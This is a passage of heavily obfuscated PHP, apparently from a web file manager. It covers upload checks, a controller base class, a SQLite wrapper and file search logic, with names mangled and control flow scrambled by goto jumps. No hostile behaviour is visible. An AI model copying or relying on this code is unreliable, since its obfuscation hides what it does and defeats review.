C¬¯ËÊèš¸: return $Fø´½‚îòº; goto fÜ´ÓÑ½“ß; Cãá¤Ì†¹º: $b®œÒéîÑ‰ = _get($this->in, $Cóßç®¯š½[1434]); if (strlen($b®œÒéîÑ‰) == 32 && IO::hashSimple($this->tempFile) == $EÑ—æ‘ùÚ && IO::hashMd5($this->tempFile) == $b®œÒéîÑ‰) { return !0; } $EÀ»‚Âê¯ç = fopen($this->tempFile, $Cóßç®¯š½[902]); goto bøŒÇõ‘ëß; eğÈŞÖ™×†: $Cóßç®¯š½ =& $_SERVER[°Óó£ÌİóèÅ]; if (count($dÈ…‘âÊÕ [$Cóßç®¯š½[1418]]) != $dÈ…‘âÊÕ [$Cóßç®¯š½[1417]]) { return !1; } $EÑ—æ‘ùÚ = _get($this->in, $Cóßç®¯š½[1425]); goto Cãá¤Ì†¹º; fÜ´ÓÑ½“ß: } public static function fileName() { goto dÓ¡‚ÙëÃÖ; c…È‰Õ¡ËŒ: $f­©‡©Œ‚ä = strtotime($in[$Cİî¡…„…ñ[1435]]); $f­©‡©Œ‚ä = $f­©‡©Œ‚ä ? $f­©‡©Œ‚ä : time(); $Dˆ´á±ºèğ = strtolower($dÆ¯Ø¶˜‘›); goto Fâ¿§‹„©˜; Fâ¿§‹„©˜: if ($Dˆ´á±ºèğ == $Cİî¡…„…ñ[1436] || $Dˆ´á±ºèğ == $Cİî¡…„…ñ[1437]) { $dÆ¯Ø¶˜‘› = date($Cİî¡…„…ñ[455], $f­©‡©Œ‚ä) . $Cİî¡…„…ñ[79] . $in[$Cİî¡…„…ñ[86]] . $Cİî¡…„…ñ[1438]; } else { if ($Dˆ´á±ºèğ == $Cİî¡…„…ñ[1439]) { $dÆ¯Ø¶˜‘› = date($Cİî¡…„…ñ[455], $f­©‡©Œ‚ä) . $Cİî¡…„…ñ[79] . $in[$Cİî¡…„…ñ[86]] . $Cİî¡…„…ñ[1440]; } } return $dÆ¯Ø¶˜‘›; goto C·†Şç ; fÎÉø˜òŠô: if (!empty($_FILES)) { $dÆ¯Ø¶˜‘› = $dÆ¯Ø¶˜‘› ? $dÆ¯Ø¶˜‘› : $_FILES[$Cİî¡…„…ñ[172]][$Cİî¡…„…ñ[395]]; } $dÆ¯Ø¶˜‘› = str_replace(array($Cİî¡…„…ñ[102], $Cİî¡…„…ñ[8]), array($Cİî¡…„…ñ[8], $Cİî¡…„…ñ[100]), trim($dÆ¯Ø¶˜‘›)); if (!is_wap()) { return $dÆ¯Ø¶˜‘›; } goto c…È‰Õ¡ËŒ; dÓ¡‚ÙëÃÖ: $Cİî¡…„…ñ =& $_SERVER[°Óó£ÌİóèÅ]; global $in; $dÆ¯Ø¶˜‘› = isset($in[$Cİî¡…„…ñ[28]]) ? $in[$Cİî¡…„…ñ[28]] : $Cİî¡…„…ñ[33]; goto fÎÉø˜òŠô; C·†Şç : } private function errorInfo($C˜À„¸Ù…Ñ) { $f¾ˆò¨”¤ê =& $_SERVER[°Óó£ÌİóèÅ]; $dó‘É†è• = array($f¾ˆò¨”¤ê[1441], $f¾ˆò¨”¤ê[1442], $f¾ˆò¨”¤ê[1443], $f¾ˆò¨”¤ê[1444], $f¾ˆò¨”¤ê[1445], $f¾ˆò¨”¤ê[1446], $f¾ˆò¨”¤ê[1447], $f¾ˆò¨”¤ê[1448]); return $C˜À„¸Ù…Ñ . $f¾ˆò¨”¤ê[4] . $dó‘É†è•[$C˜À„¸Ù…Ñ]; } } goto c‘Öæ—ö; få ¦°Ü¸À: class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($F±ƒÀ‹‚Êë, $Dè¡†ÓÂ) { $BÔ­èÉŞÏ³ =& $_SERVER[°Óó£ÌİóèÅ]; if (isset(self::$_methodList[$F±ƒÀ‹‚Êë])) { return @call_user_func_array(self::$_methodList[$F±ƒÀ‹‚Êë], $Dè¡†ÓÂ); } else { if (method_exists($this, $F±ƒÀ‹‚Êë)) { return call_user_func_array(array($this, $F±ƒÀ‹‚Êë), $Dè¡†ÓÂ); } else { think_exception(__CLASS__ . $BÔ­èÉŞÏ³[4] . $F±ƒÀ‹‚Êë . $BÔ­èÉŞÏ³[5]); } } } public static function __callStatic($Dò¶èïáµñ, $eõÒ“¨æìñ) { if (isset(self::$_methodListStatic[$Dò¶èïáµñ])) { return call_user_func_array(self::$_methodListStatic[$Dò¶èïáµñ], $eõÒ“¨æìñ); } else { if (method_exists(self, $Dò¶èïáµñ)) { return call_user_func_array(array(self, $Dò¶èïáµñ), $eõÒ“¨æìñ); } else { show_json("{$Dò¶èïáµñ}\x28\51\40\x6e\x6f\164\40\145\x78\x69\163\164\x3b", !1); } } } public static function addMethod($E†İ…‹¬Ó¬, $dã­‰É™) { self::$_methodList[$E†İ…‹¬Ó¬] = $dã­‰É™; } public static function addMethodStatic($BÅÂÉœ÷Æ, $CÂ®–î†‰) { self::$_methodListStatic[$BÅÂÉœ÷Æ] = $CÂ®–î†‰; } } class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto AÀŒË“¼â‘; AÀŒË“¼â‘: $fì¥¯Ş„‹Å =& $_SERVER[°Óó£ÌİóèÅ]; global $in, $config; $this->config =& $config; goto EâØÁ˜ì¼õ; EâØÁ˜ì¼õ: $this->in =& $in; $this->values[$fì¥¯Ş„‹Å[6]] =& $config; $this->values[$fì¥¯Ş„‹Å[7]] =& $in; goto dÚ†¡Ğè’­; dÚ†¡Ğè’­: $this->tpl = TEMPLATE . MOD . $fì¥¯Ş„‹Å[8]; $this->_classObjectID = mt_rand(0, 10000); goto d‚Ş·ñ§ò; d‚Ş·ñ§ò: } public function loadClass($aÓÛ¹Ğ‡š‚) { if (1 === func_num_args()) { $this->{$aÓÛ¹Ğ‡š‚} = new $aÓÛ¹Ğ‡š‚(); } else { $aÙ¯¶¥Íë = new ReflectionClass($aÓÛ¹Ğ‡š‚); $c¯í„××…Ü = func_get_args(); array_shift($c¯í„××…Ü); $this->{$aÓÛ¹Ğ‡š‚} = $aÙ¯¶¥Íë->newInstanceArgs($c¯í„××…Ü); } return $this->{$aÓÛ¹Ğ‡š‚}; } protected function assign($Dö—¿‘Ì», $D™ë‡àîäğ) { $this->values[$Dö—¿‘Ì»] = $D™ë‡àîäğ; } protected function display($aÉƒŞ·çÙ–) { ob_end_clean(); extract($this->values); require $this->tpl . $aÉƒŞ·çÙ–; } } class DbSqliteBase extends Db { public function __construct($B…ï‚ßŒó¢ = '') { $bĞ„‚»”³İ =& $_SERVER[°Óó£ÌİóèÅ]; if (!extension_loaded($bĞ„‚»”³İ[9])) { think_exception(think_lang($bĞ„‚»”³İ[10]) . $bĞ„‚»”³İ[11]); } if (!empty($B…ï‚ßŒó¢)) { if (!isset($B…ï‚ßŒó¢[$bĞ„‚»”³İ[12]])) { $B…ï‚ßŒó¢[$bĞ„‚»”³İ[12]] = 438; } $this->config = $B…ï‚ßŒó¢; if (empty($this->config[$bĞ„‚»”³İ[13]])) { $this->config[$bĞ„‚»”³İ[13]] = array(); } } } public function connect($fˆ»Æ°õó = '', $A†•‘ğôƒ´ = 0) { $Fêæ¾ÇßÄ´ =& $_SERVER[°Óó£ÌİóèÅ]; if (!isset($this->linkID[$A†•‘ğôƒ´])) { goto aœ£¦”Şƒ; aœ£¦”Şƒ: if (empty($fˆ»Æ°õó)) { $fˆ»Æ°õó = $this->config; } $AÖóÄ‡¦ºÓ = !empty($fˆ»Æ°õó[$Fêæ¾ÇßÄ´[13]][$Fêæ¾ÇßÄ´[14]]) ? $fˆ»Æ°õó[$Fêæ¾ÇßÄ´[13]][$Fêæ¾ÇßÄ´[14]] : $this->pconnect; $aË«ˆÜÁ¥ß = $AÖóÄ‡¦ºÓ ? $Fêæ¾ÇßÄ´[15] : $Fêæ¾ÇßÄ´[16]; goto F·Í©ÉÙñÄ; F·Í©ÉÙñÄ: $this->linkID[$A†•‘ğôƒ´] = $aË«ˆÜÁ¥ß($fˆ»Æ°õó[$Fêæ¾ÇßÄ´[17]], $fˆ»Æ°õó[$Fêæ¾ÇßÄ´[12]]); if (!$this->linkID[$A†•‘ğôƒ´]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto F—¦¿©ÕòŠ; F—¦¿©ÕòŠ: @sqlite_busy_timeout($this->linkID[$A†•‘ğôƒ´], 30000); if (1 != think_config($Fêæ¾ÇßÄ´[18])) { unset($this->config); } goto C§ Ûğ³¢ª; C§ Ûğ³¢ª: } return $this->linkID[$A†•‘ğôƒ´]; } public function free() { $this->queryID = null; } public function query($FäÊë¯ó) { goto dÉ³îÀªóœ; aš‘Š÷‡åÄ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $E¦éË©ŠÀ = $this->getAll(); return $E¦éË©ŠÀ; } goto b¹Œ¨µé›Ç; Bó‚ Ò˜Êé: $this->queryStr = $FäÊë¯ó; if ($this->queryID) { $this->free(); } think_action_status($b¯Ì¸³äÈ¯[19], 1); goto A–ÌŸ©ª‚; A–ÌŸ©ª‚: think_status($b¯Ì¸³äÈ¯[20]); $this->queryID = sqlite_query($this->_linkID, $FäÊë¯ó); $this->debug(); goto aš‘Š÷‡åÄ; dÉ³îÀªóœ: $b¯Ì¸³äÈ¯ =& $_SERVER[°Óó£ÌİóèÅ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Bó‚ Ò˜Êé; b¹Œ¨µé›Ç: } public function execute($fñÄ„‘‘Â) { goto A¹÷ÆéØñù; A¹÷ÆéØñù: $cÍ’Æ¥…é© =& $_SERVER[°Óó£ÌİóèÅ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto AÑØÂ¥ªÎƒ; AÑØÂ¥ªÎƒ: $this->queryStr = $fñÄ„‘‘Â; if ($this->queryID) { $this->free(); } think_action_status($cÍ’Æ¥…é©[21], 1); goto A †¨Ì×Å; a›Ì´†±: if (!1 === $BÏŠòº†š) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto A™âİ–×ší; A †¨Ì×Å: think_status($cÍ’Æ¥…é©[20]); $BÏŠòº†š = sqlite_exec($this->_linkID, $fñÄ„‘‘Â); $this->debug(); goto a›Ì´†±; A™âİ–×ší: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[°Óó£ÌİóèÅ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dŸäâÚŸ = sqlite_query($this->_linkID, $_SERVER[°Óó£ÌİóèÅ][23]); if (!$dŸäâÚŸ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Bœ‹¿–ëîÙ = sqlite_query($this->_linkID, $_SERVER[°Óó£ÌİóèÅ][24]); if (!$Bœ‹¿–ëîÙ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $CÃ“öÍ×‚¡ = array(); if ($this->numRows > 0) { for ($fÂã‘¨¤ší = 0; $fÂã‘¨¤ší < $this->numRows; $fÂã‘¨¤ší++) { $CÃ“öÍ×‚¡[$fÂã‘¨¤ší] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $CÃ“öÍ×‚¡; } public function getFields($d¼ŠïÚ·¨µ) { $DèÉƒæªµ† =& $_SERVER[°Óó£ÌİóèÅ]; $A•¿ÕÉ£ = $this->query($DèÉƒæªµ†[25] . $d¼ŠïÚ·¨µ . $DèÉƒæªµ†[26]); $C¸‘Î¾«Œ = array(); if ($A•¿ÕÉ£) { foreach ($A•¿ÕÉ£ as $C¿×¼Ù­§ö => $A÷Î«ÒÊßÃ) { $C¸‘Î¾«Œ[$A÷Î«ÒÊßÃ[$DèÉƒæªµ†[27]]] = array($DèÉƒæªµ†[28] => $A÷Î«ÒÊßÃ[$DèÉƒæªµ†[27]], $DèÉƒæªµ†[29] => $A÷Î«ÒÊßÃ[$DèÉƒæªµ†[30]], $DèÉƒæªµ†[31] => (bool) ($A÷Î«ÒÊßÃ[$DèÉƒæªµ†[32]] === $DèÉƒæªµ†[33]), $DèÉƒæªµ†[34] => $A÷Î«ÒÊßÃ[$DèÉƒæªµ†[35]], $DèÉƒæªµ†[36] => strtolower($A÷Î«ÒÊßÃ[$DèÉƒæªµ†[37]]) == $DèÉƒæªµ†[38], $DèÉƒæªµ†[39] => strtolower($A÷Î«ÒÊßÃ[$DèÉƒæªµ†[40]]) == $DèÉƒæªµ†[41]); } } return $C¸‘Î¾«Œ; } public function getTables($F‡óğÛ‘Ä = '') { $eë£¯†Äİ =& $_SERVER[°Óó£ÌİóèÅ]; $E¿Ï²ö¨ÁØ = $this->query($eë£¯†Äİ[42] . $eë£¯†Äİ[43] . $eë£¯†Äİ[44]); $bƒË‘ÕÄÔÒ = array(); foreach ($E¿Ï²ö¨ÁØ as $Bñİ¶ÚÁó‡ => $BìÉØÕÔ©›) { $bƒË‘ÕÄÔÒ[$Bñİ¶ÚÁó‡] = current($BìÉØÕÔ©›); } return $bƒË‘ÕÄÔÒ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Cíô¯½Ïéå =& $_SERVER[°Óó£ÌİóèÅ]; $b¼ß‚òÔ—Ô = sqlite_last_error($this->_linkID); $this->error = $b¼ß‚òÔ—Ô . $Cíô¯½Ïéå[4] . sqlite_error_string($b¼ß‚òÔ—Ô); if ($Cíô¯½Ïéå[33] != $this->queryStr) { $this->error .= LNG($Cíô¯½Ïéå[45]) . $this->queryStr; } think_trace($this->error, $Cíô¯½Ïéå[33], $Cíô¯½Ïéå[46]); return $this->error; } public function escapeString($bîØˆ‡‡Œ…) { return sqlite_escape_string($bîØˆ‡‡Œ…); } public function parseLimit($E¦İ…Õê–°) { $DÇÈØ‚Š¦· =& $_SERVER[°Óó£ÌİóèÅ]; $d‰Àè¯…ºí = $DÇÈØ‚Š¦·[33]; if (!empty($E¦İ…Õê–°)) { $E¦İ…Õê–° = explode($DÇÈØ‚Š¦·[47], $E¦İ…Õê–°); if (count($E¦İ…Õê–°) > 1) { $d‰Àè¯…ºí .= $DÇÈØ‚Š¦·[48] . $E¦İ…Õê–°[1] . $DÇÈØ‚Š¦·[49] . $E¦İ…Õê–°[0] . $DÇÈØ‚Š¦·[50]; } else { $d‰Àè¯…ºí .= $DÇÈØ‚Š¦·[48] . $E¦İ…Õê–°[0] . $DÇÈØ‚Š¦·[50]; } } return $d‰Àè¯…ºí; } } goto bŞ—©¬òï; aÖ„ãÑÜĞ°: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($DÌø§ÏÖ‹) { goto CõóÉ¡—ÁÜ; CõóÉ¡—ÁÜ: $Fİ¼ˆ®æ =& $_SERVER[°Óó£ÌİóèÅ]; $c¼´ØºŒ¸ = KodIO::fileTypeList(); $d¨ÈåªÀÈ = $c¼´ØºŒ¸[$DÌø§ÏÖ‹]; goto AìëÚ´‰ÂŒ; AìëÚ´‰ÂŒ: if (!$d¨ÈåªÀÈ) { return array(); } $e´§¦¯‘¤é = $d¨ÈåªÀÈ[$Fİ¼ˆ®æ[165]]; $DßÃÀ‚Ü±È = $Fİ¼ˆ®æ[7]; goto FÍ¼Ûµ°ö£; FÍ¼Ûµ°ö£: if (!$d¨ÈåªÀÈ[$Fİ¼ˆ®æ[165]]) { $cô¯’Ì = array_to_keyvalue($c¼´ØºŒ¸, $Fİ¼ˆ®æ[33], $Fİ¼ˆ®æ[165]); $e´§¦¯‘¤é = implode($Fİ¼ˆ®æ[47], $cô¯’Ì); $DßÃÀ‚Ü±È = $Fİ¼ˆ®æ[1708]; } $e•ùÀ¹¼¡÷ = explode($Fİ¼ˆ®æ[47], trim($e´§¦¯‘¤é, $Fİ¼ˆ®æ[47])); return array($DßÃÀ‚Ü±È, $e•ùÀ¹¼¡÷); goto fÕªˆ§Ï™; fÕªˆ§Ï™: } public function listPathType($fÀÃø¬ÅØ) { $c ÖØÍóï– =& $_SERVER[°Óó£ÌİóèÅ]; $cÉ ÉÌ›ì = $this->fileTypeWhere($fÀÃø¬ÅØ); if (!$cÉ ÉÌ›ì) { return array(); } $eŠ±ƒ»ğÉÃ = array($c ÖØÍóï–[400] => SourceModel::TYPE_USER, $c ÖØÍóï–[402] => USER_ID, $c ÖØÍóï–[394] => 0, $c ÖØÍóï–[396] => $cÉ ÉÌ›ì); return $this->listSource($eŠ±ƒ»ğÉÃ); } public function listSearch($B†ËÂ¤Ç©ö, $F”¥¦å†Ï = 300) { goto d÷Ş‰£‹ë; EÇšÇç×©: $this->_listFilterInfo($d®›Æ”Ü¾ì); return $d®›Æ”Ü¾ì; goto f°ïî³‚; aóšôïä°‘: $this->_listSearchBindPinyin($B†ËÂ¤Ç©ö, $cÉ…¥©—ë¸, $E¤òÙêÖùÎ); $this->alias($A¥†Ù­¦†˜[1744])->_makeOrder()->cache(null, 10); $d®›Æ”Ü¾ì = $this->distinct(!0)->field($E¤òÙêÖùÎ)->where($cÉ…¥©—ë¸)->selectPage($F”¥¦å†Ï); goto cÛ£É¼·òê; d÷Ş‰£‹ë: $A¥†Ù­¦†˜ =& $_SERVER[°Óó£ÌİóèÅ]; if (isset($B†ËÂ¤Ç©ö[$A¥†Ù­¦†˜[1635]]) && $B†ËÂ¤Ç©ö[$A¥†Ù­¦†˜[1635]]) { $B†ËÂ¤Ç©ö[$A¥†Ù­¦†˜[1635]] = str_replace($A¥†Ù­¦†˜[1741], $A¥†Ù­¦†˜[1742], trim($B†ËÂ¤Ç©ö[$A¥†Ù­¦†˜[1635]])); } $cÉ…¥©—ë¸ = $this->_parseSearchWhere($B†ËÂ¤Ç©ö); goto dëó±Á‘œ; dëó±Á‘œ: if (!isset($cÉ…¥©—ë¸[$A¥†Ù­¦†˜[418]])) { $cÉ…¥©—ë¸[$A¥†Ù­¦†˜[418]] = 0; } $E¤òÙêÖùÎ = $A¥†Ù­¦†˜[1743]; $C“½¿²‚¡Ò = $E¤òÙêÖùÎ; goto aóšôïä°‘; cÛ£É¼·òê: $this->_listSearchDesc($d®›Æ”Ü¾ì, $B†ËÂ¤Ç©ö, $C“½¿²‚¡Ò); $this->_listSearchTag($d®›Æ”Ü¾ì, $B†ËÂ¤Ç©ö, $C“½¿²‚¡Ò); $this->_listDataApply($d®›Æ”Ü¾ì[$A¥†Ù­¦†˜[364]]); goto EÇšÇç×©; f°ïî³‚: } private function _listSearchTag(&$dšâÕ«ƒßÓ, $CÃš¡àà×‹, $FÔªêÛ÷è) { goto AÜÌ°ôöß¤; AæáŒÒìŒè: $EçŒã¥¬«™ = array(); $eÄµ”¤ô© = $CÃš¡àà×‹[$C˜áùÏÆ [1635]]; foreach ($A‹Ş‰–íÂ as $D†ˆÙÒŠÕ) { $b¨±¾ô = $D†ˆÙÒŠÕ[$C˜áùÏÆ [28]]; $dŠ¾Ä¸¸ = str_replace($C˜áùÏÆ [50], $C˜áùÏÆ [33], Pinyin::encode($b¨±¾ô)); if (stripos($b¨±¾ô, $eÄµ”¤ô©) !== !1 || stripos($dŠ¾Ä¸¸, $eÄµ”¤ô©) !== !1) { $EçŒã¥¬«™[] = $D†ˆÙÒŠÕ[$C˜áùÏÆ [376]]; } } goto cñƒ“ìš‚Æ; Eˆ••†º³â: $bÒù·–›„ = array_to_keyvalue($bÒù·–›„, $C˜áùÏÆ [33], $C˜áùÏÆ [84]); $bÌÏ“ô‚ä = array_unique($bÒù·–›„); $this->_listSearchMerge($dšâÕ«ƒßÓ, $CÃš¡àà×‹, $FÔªêÛ÷è, $bÌÏ“ô‚ä); goto fîÎ÷ÒŠ¬’; cñƒ“ìš‚Æ: if (!$EçŒã¥¬«™) { return; } $E²Ğè¢Ú“Ú = array($C˜áùÏÆ [1746] => array($C˜áùÏÆ [7], $EçŒã¥¬«™)); $bÒù·–›„ = Model($C˜áùÏÆ [1747])->field($C˜áùÏÆ [84])->where($E²Ğè¢Ú“Ú)->select(); goto Eˆ••†º³â; AÜÌ°ôöß¤: $C˜áùÏÆ  =& $_SERVER[°Óó£ÌİóèÅ]; if (!$CÃš¡àà×‹[$C˜áùÏÆ [1635]] || $dšâÕ«ƒßÓ[$C˜áùÏÆ [361]][$C˜áùÏÆ [350]] > 1) { return; } $A‹Ş‰–íÂ = Model($C˜áùÏÆ [1745])->listData(); goto AæáŒÒìŒè; fîÎ÷ÒŠ¬’: } private function _listSearchDesc(&$F“š½Šá, $b§¬±Á‘ã, $A÷ÜªÌÊå) { goto bêÀ¨ªåÒÓ; CÂÔõœÀø®: $A–öÏñÂŸÎ = Model($FÂ‘†´³[388])->field($FÂ‘†´³[382])->where($d¢‚„†ïË)->select(); $c§ÜÌÒ­¢Ş = array_to_keyvalue($A–öÏñÂŸÎ, $FÂ‘†´³[33], $FÂ‘†´³[382]); $this->_listSearchMerge($F“š½Šá, $b§¬±Á‘ã, $A÷ÜªÌÊå, $c§ÜÌÒ­¢Ş); goto c–ìËÚß™; f»¾Êí¯ ñ: $cå¿™„ì­ = array_unique($cå¿™„ì­); if (!$cå¿™„ì­) { return; } $d¢‚„†ïË = array($FÂ‘†´³[382] => array($FÂ‘†´³[7], $cå¿™„ì­), $FÂ‘†´³[96] => $FÂ‘†´³[1590], $FÂ‘†´³[367] => array($FÂ‘†´³[528], $FÂ‘†´³[1637] . $b§¬±Á‘ã[$FÂ‘†´³[1635]] . $FÂ‘†´³[1637])); goto CÂÔõœÀø®; bêÀ¨ªåÒÓ: $FÂ‘†´³ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$b§¬±Á‘ã[$FÂ‘†´³[1635]] || $F“š½Šá[$FÂ‘†´³[361]][$FÂ‘†´³[350]] > 1) { return; } $cå¿™„ì­ = $this->listSearchChildren($b§¬±Á‘ã[$FÂ‘†´³[392]]); goto f»¾Êí¯ ñ; c–ìËÚß™: } private function _listSearchMerge(&$bè–Á¾ß“›, $Cø„‰Š¶Ëå, $b¢²”‚åç„, $AÄ¤ŠÎŒ‹Å) { goto CİôÕÏ‰ßå; D–àâ¯İ¶: $dí×ëï²ì = $this->field($b¢²”‚åç„)->where($fôİ²êğ¹Ä)->select(); if (!$dí×ëï²ì) { return; } $B’Ó•Ã¸ = array(); goto E‚‰Í»ºä; E‚‰Í»ºä: foreach ($dí×ëï²ì as $a†ÕÒç­ÅÈ) { $E´®ä‹¼ğÏ = $AµØœ³½Œ¤[47] . $Cø„‰Š¶Ëå[$AµØœ³½Œ¤[392]] . $AµØœ³½Œ¤[47]; if (stripos($a†ÕÒç­ÅÈ[$AµØœ³½Œ¤[381]], $E´®ä‹¼ğÏ) !== !1) { $B’Ó•Ã¸[] = $a†ÕÒç­ÅÈ; } } $bè–Á¾ß“›[$AµØœ³½Œ¤[364]] = array_merge($B’Ó•Ã¸, $bè–Á¾ß“›[$AµØœ³½Œ¤[364]]); $bè–Á¾ß“›[$AµØœ³½Œ¤[361]][$AµØœ³½Œ¤[362]] += count($B’Ó•Ã¸); goto C½Ø£ÈÄÃ”; CİôÕÏ‰ßå: $AµØœ³½Œ¤ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$AÄ¤ŠÎŒ‹Å) { return; } $F¸µï†ñ„÷ = array_to_keyvalue($bè–Á¾ß“›[$AµØœ³½Œ¤[364]], $AµØœ³½Œ¤[33], $AµØœ³½Œ¤[382]); goto F¹Í¬Ù¹ôá; F¹Í¬Ù¹ôá: $BÏÔøåå™î = array_diff($AÄ¤ŠÎŒ‹Å, $F¸µï†ñ„÷); if (!$BÏÔøåå™î) { return; } $fôİ²êğ¹Ä = array($AµØœ³½Œ¤[382] => array($AµØœ³½Œ¤[7], $BÏÔøåå™î)); goto D–àâ¯İ¶; C½Ø£ÈÄÃ”: } public function listSearchChildren($BÖÚš°åôö, $E‚™–†”À = 5000) { goto AßÓåÃªÄÛ; bİ×ß„Õ†: $b®×«ÈË’ñ = $this->field($fâ²àìÃã[382])->where($FíÂ†¬éĞğ)->select(); $DÕ™š¥½î– = array_to_keyvalue($b®×«ÈË’ñ, $fâ²àìÃã[33], $fâ²àìÃã[382]); return $DÕ™š¥½î–; goto FÛÇ·àß…½; AßÓåÃªÄÛ: $fâ²àìÃã =& $_SERVER[°Óó£ÌİóèÅ]; $DÕ™š¥½î– = array(); $fÔí¡ÑÊ© = $this->sourceInfo($BÖÚš°åôö); goto Cá†ßóÏ³; Cá†ßóÏ³: $FíÂ†¬éĞğ = array($fâ²àìÃã[381] => array($fâ²àìÃã[528], $fÔí¡ÑÊ©[$fâ²àìÃã[381]] . $fÔí¡ÑÊ©[$fâ²àìÃã[382]] . $fâ²àìÃã[417])); $eõ˜¢õÖò = $this->field($fâ²àìÃã[382])->where($FíÂ†¬éĞğ)->count(); if ($eõ˜¢õÖò > $E‚™–†”À) { return $this->_listSearchChildrenNear($BÖÚš°åôö, $E‚™–†”À); } goto bİ×ß„Õ†; FÛÇ·àß…½: } private function _listSearchChildrenNear($B‡„¦ß†, $AÙå÷äÑƒ‰) { goto F¨¦œº¼Øç; b¢ÀÀÇ‚“…: $DÊåóÉ†¶‹ = $this->field($eÊÎçËè¿Ù[1748])->where($Dã°í²‹Š“)->select(); $a±ÓÈ¡–ºñ = array_to_keyvalue(array_filter_by_field($DÊåóÉ†¶‹, $eÊÎçËè¿Ù[383], $eÊÎçËè¿Ù[384]), $eÊÎçËè¿Ù[33], $eÊÎçËè¿Ù[382]); $d³œ•¬Ğ ¸ = array_merge($d³œ•¬Ğ ¸, array_to_keyvalue($DÊåóÉ†¶‹, $eÊÎçËè¿Ù[33], $eÊÎçËè¿Ù[382])); goto EòŒ ¼ÕœÔ; bÏì…‚Ÿˆ¦: $d³œ•¬Ğ ¸ = array_merge($d³œ•¬Ğ ¸, array_to_keyvalue($DÊåóÉ†¶‹, $eÊÎçËè¿Ù[33], $eÊÎçËè¿Ù[382])); $d³œ•¬Ğ ¸ = array_slice($d³œ•¬Ğ ¸, 0, $AÙå÷äÑƒ‰); return $d³œ•¬Ğ ¸; goto bŠ”«ç¸®Ÿ; F¨¦œº¼Øç: $eÊÎçËè¿Ù =& $_SERVER[°Óó£ÌİóèÅ]; $d³œ•¬Ğ ¸ = array(); $Dã°í²‹Š“ = array($eÊÎçËè¿Ù[392] => $B‡„¦ß†); goto b¢ÀÀÇ‚“…; EòŒ ¼ÕœÔ: if (!$a±ÓÈ¡–ºñ) { return $d³œ•¬Ğ ¸; } $Dã°í²‹Š“ = array($eÊÎçËè¿Ù[392] => array($eÊÎçËè¿Ù[7], $a±ÓÈ¡–ºñ)); $DÊåóÉ†¶‹ = $this->field($eÊÎçËè¿Ù[1748])->where($Dã°í²‹Š“)->select(); goto bÏì…‚Ÿˆ¦; bŠ”«ç¸®Ÿ: } private function _listSearchBindPinyin($cŒÜ½®™¸Ö, &$eµ¤¿Æ‡‹, &$f¿§²¦‡…) { goto a‡•ÆÆç; fñäŠÕÏ×ö: unset($eµ¤¿Æ‡‹[$EŸĞÅªÚ¡ò[28]]); foreach ($eµ¤¿Æ‡‹ as $e›Í ã±ÑÑ => $B“ˆƒÔÓ÷Î) { $c““µˆ¬ÙÉ[$EŸĞÅªÚ¡ò[1750] . $e›Í ã±ÑÑ] = $B“ˆƒÔÓ÷Î; } $Eâø¯¹µ‡Í = array($EŸĞÅªÚ¡ò[416], $EŸĞÅªÚ¡ò[1637] . $cŒÜ½®™¸Ö[$EŸĞÅªÚ¡ò[1635]] . $EŸĞÅªÚ¡ò[1637]); goto DŞ™½¦ÄÍ; C¯Ÿ‚ª¼×ø: $c““µˆ¬ÙÉ = array(); $f¿§²¦‡… = str_replace(array($EŸĞÅªÚ¡ò[61], $EŸĞÅªÚ¡ò[50], $EŸĞÅªÚ¡ò[1749]), $EŸĞÅªÚ¡ò[33], $f¿§²¦‡…); $f¿§²¦‡… = $EŸĞÅªÚ¡ò[1750] . str_replace($EŸĞÅªÚ¡ò[47], $EŸĞÅªÚ¡ò[1751], $f¿§²¦‡…); goto fñäŠÕÏ×ö; a‡•ÆÆç: $EŸĞÅªÚ¡ò =& $_SERVER[°Óó£ÌİóèÅ]; if (!Input::check($cŒÜ½®™¸Ö[$EŸĞÅªÚ¡ò[1635]], $EŸĞÅªÚ¡ò[317]) || strlen($cŒÜ½®™¸Ö[$EŸĞÅªÚ¡ò[1635]]) < 2) { return; } $Dº‹™†­ = "\114\x45\106\x54\x20\112\x4f\111\x4e\x20{$this->tablePrefix}\151\157\x5f\x73\157\x75\x72\x63\x65\x5f\155\145\x74\x61\40\155\x65\164\141\x20\157\x6e\40\163\157\165\162\143\145\56\163\x6f\165\162\143\145\x49\104\40\x3d\40\x6d\x65\164\141\x2e\163\157\x75\162\x63\x65\111\104"; goto C¯Ÿ‚ª¼×ø; DŞ™½¦ÄÍ: $c““µˆ¬ÙÉ[] = array($EŸĞÅªÚ¡ò[1752] => $Eâø¯¹µ‡Í, $EŸĞÅªÚ¡ò[681] => $EŸĞÅªÚ¡ò[1639], array($EŸĞÅªÚ¡ò[1753] => $Eâø¯¹µ‡Í, $EŸĞÅªÚ¡ò[1754] => array($EŸĞÅªÚ¡ò[7], array($EŸĞÅªÚ¡ò[412], $EŸĞÅªÚ¡ò[413])))); $this->join($Dº‹™†­); $eµ¤¿Æ‡‹ = $c““µˆ¬ÙÉ; goto D‹†¦Ç’‹­; D‹†¦Ç’‹­: } private function _parseSearchWhere($B’Æç¾—Å) { goto eš‡¼¶é“¹; CâŒöÊ°ò: if (isset($B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[1635]]) && $B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[1635]]) { $D›¯åùØÀÎ = 